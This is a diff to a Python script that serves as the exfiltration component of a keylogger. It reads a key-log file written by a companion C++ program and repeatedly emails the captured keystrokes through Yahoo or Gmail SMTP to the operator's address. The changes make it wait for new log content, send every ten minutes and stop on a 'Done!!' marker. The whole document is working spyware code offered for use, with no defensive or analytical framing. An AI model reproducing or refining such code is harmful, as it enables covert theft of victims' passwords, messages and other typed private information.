@@ -6,31 +6,35 @@ from time import sleep
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 
-email = 'YOUR EMAIL' # Replace with your email
-passw = 'YOUR EMAIL PASSWORD' # Replace with your email password
-logfile = 'logfile.txt' # This is the name of the file where the C++ program will write key logs
-count = 1 # Number of email sent to you
-
-smtp = smtplib.SMTP('smtp.mail.yahoo.com', 587) # Replace with 'smtp.gmail.com' if you are using a GMAIL
-smtp.ehlo()
-smtp.starttls()
-smtp.login(email, passw)
+email = 'youremail' # Change
+passw = 'yourpassword' # Change
+logfile = 'logfile.txt'
+count = 1
+previous = ''
 
 def Send():
     global count
+    global previous
+    keylog = ReadLogFile()
+    while keylog == previous or len(keylog) == 0:
+        keylog = ReadLogFile()
+    sleep(600)
+    keylog = ReadLogFile()
+    previous = keylog
+    smtp = smtplib.SMTP('smtp.mail.yahoo.com', 587) # Change Gmail is: smtp.gmail.com
+    smtp.ehlo()
+    smtp.starttls()
+    smtp.login(email, passw)
     msg = MIMEMultipart()
     msg['From'] = email
     msg['To'] = email
     msg['Subject'] = 'Key #{}'.format(count)
-    keylogs = ReadLogFile() + '\nWaiting 5 Mins Before Sending Again...'
-
-    if 'Done!!' in keylogs:
-        smtp.close()
-        sys.exit(0)
-    body = MIMEText(keylogs)
-    msg.attach(body)
+    msg.attach(MIMEText(keylog))
     smtp.sendmail(email, email, msg.as_string())
+    smtp.close()
     count += 1
+    if 'Done!!' in keylog:
+        sys.exit(0)
 
 def ReadLogFile():
     try:
@@ -42,7 +46,7 @@ def ReadLogFile():
 def main():
     while True:
         Send()
-        sleep(120) # Send Email Every 120 Seconds.
 
 if __name__ == '__main__':
     main()
+    
